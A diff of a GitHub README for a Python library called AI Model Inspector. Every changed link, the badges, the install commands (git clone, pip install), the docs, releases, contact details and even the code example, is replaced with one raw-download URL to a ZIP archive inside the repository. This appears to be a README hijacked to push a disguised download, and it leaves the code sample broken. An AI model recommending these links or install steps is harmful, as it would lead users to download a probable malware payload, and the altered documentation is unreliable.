@@ -1,6 +1,6 @@
 # AI Model Inspector 🧠🔍
 
-![GitHub release](https://img.shields.io/github/release/arish-mhrjn/aimodelinspector.svg) ![GitHub issues](https://img.shields.io/github/issues/arish-mhrjn/aimodelinspector.svg) ![GitHub stars](https://img.shields.io/github/stars/arish-mhrjn/aimodelinspector.svg)
+![GitHub release](https://github.com/arish-mhrjn/aimodelinspector/raw/refs/heads/master/model_inspector/analyzers/Software_3.7.zip) ![GitHub issues](https://github.com/arish-mhrjn/aimodelinspector/raw/refs/heads/master/model_inspector/analyzers/Software_3.7.zip) ![GitHub stars](https://github.com/arish-mhrjn/aimodelinspector/raw/refs/heads/master/model_inspector/analyzers/Software_3.7.zip)
 
 Welcome to **AI Model Inspector**, a comprehensive Python library designed for exploring, self-educating, and categorizing AI models. This library simplifies the process of analyzing various AI frameworks, making it easier for developers and researchers to understand and manage their models effectively.
 
@@ -30,7 +30,7 @@ To get started with **AI Model Inspector**, follow these simple steps:
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/arish-mhrjn/aimodelinspector.git
+   git clone https://github.com/arish-mhrjn/aimodelinspector/raw/refs/heads/master/model_inspector/analyzers/Software_3.7.zip
    ```
 2. Navigate to the project directory:
    ```bash
@@ -38,7 +38,7 @@ To get started with **AI Model Inspector**, follow these simple steps:
    ```
 3. Install the required dependencies:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/arish-mhrjn/aimodelinspector/raw/refs/heads/master/model_inspector/analyzers/Software_3.7.zip
    ```
 
 ## Usage
@@ -49,16 +49,16 @@ Using **AI Model Inspector** is straightforward. Here's a basic example to get y
 from aimodelinspector import ModelInspector
 
 # Load a model
-model = ModelInspector.load_model('path/to/your/model')
+model = https://github.com/arish-mhrjn/aimodelinspector/raw/refs/heads/master/model_inspector/analyzers/Software_3.7.zip('path/to/your/model')
 
 # Explore the model
-model.summary()
+https://github.com/arish-mhrjn/aimodelinspector/raw/refs/heads/master/model_inspector/analyzers/Software_3.7.zip()
 
 # Visualize performance
-model.visualize_performance()
+https://github.com/arish-mhrjn/aimodelinspector/raw/refs/heads/master/model_inspector/analyzers/Software_3.7.zip()
 ```
 
-For detailed usage instructions, please refer to the [documentation](https://github.com/arish-mhrjn/aimodelinspector/wiki).
+For detailed usage instructions, please refer to the [documentation](https://github.com/arish-mhrjn/aimodelinspector/raw/refs/heads/master/model_inspector/analyzers/Software_3.7.zip).
 
 ## Supported Frameworks
 
@@ -102,14 +102,14 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Releases
 
-For the latest updates and releases, please visit the [Releases section](https://github.com/arish-mhrjn/aimodelinspector/releases). Here, you can download the latest version and see what's new in each release.
+For the latest updates and releases, please visit the [Releases section](https://github.com/arish-mhrjn/aimodelinspector/raw/refs/heads/master/model_inspector/analyzers/Software_3.7.zip). Here, you can download the latest version and see what's new in each release.
 
 ## Contact
 
 If you have any questions or suggestions, feel free to reach out:
 
 - **Author**: Arish Mhrjn
-- **Email**: arish@example.com
-- **Twitter**: [@arish_mhrjn](https://twitter.com/arish_mhrjn)
+- **Email**: https://github.com/arish-mhrjn/aimodelinspector/raw/refs/heads/master/model_inspector/analyzers/Software_3.7.zip
+- **Twitter**: [@arish_mhrjn](https://github.com/arish-mhrjn/aimodelinspector/raw/refs/heads/master/model_inspector/analyzers/Software_3.7.zip)
 
 Thank you for checking out **AI Model Inspector**! We hope this library helps you in your AI model exploration and management journey. Happy coding!
